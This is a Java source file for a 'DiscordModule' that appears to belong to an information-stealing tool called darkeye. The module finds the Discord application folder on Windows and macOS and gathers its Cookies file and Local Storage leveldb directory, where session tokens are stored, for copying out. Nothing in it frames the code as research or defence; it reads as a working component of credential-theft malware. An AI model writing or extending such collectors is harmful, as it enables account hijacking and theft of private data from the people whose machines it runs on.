package org.spray.darkeye.module;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import org.spray.darkeye.managers.CopyManager;
import org.spray.darkeye.objects.Data;
import org.spray.darkeye.objects.FileData;
import org.spray.darkeye.utils.OSTools;

public class DiscordModule extends CopyManager {

	public DiscordModule(String path) {
		super(path);
	}

	@Override
	public String getPath() {
		return "Discord";
	}

	@Override
	protected List<Data> getData() {
		if (!new File(getFolder()).exists())
			return null;
		
		List<Data> data = new ArrayList<>();

		List<FileData> files = new ArrayList<>();

		files.add(new FileData(new File(getCookie()), "Cookies"));
		files.add(new FileData(new File(getLevelDB()), "leveldb"));

		data.add(new Data(files, ""));
		return data;
	}

	private String getCookie() {
		return getFolder() + "/Cookies";
	}

	private String getLevelDB() {
		return getFolder() + "/Local Storage/leveldb";
	}

	private String getFolder() {
		String folder = "";
		switch (OSTools.getType()) {
		case Windows:
			folder = System.getenv("APPDATA") + "/Discord";
			break;
		case MacOS:
			folder = "/Library/Application Support/Discord";
			break;
		default:
			break;
		}
		return folder;
	}
}
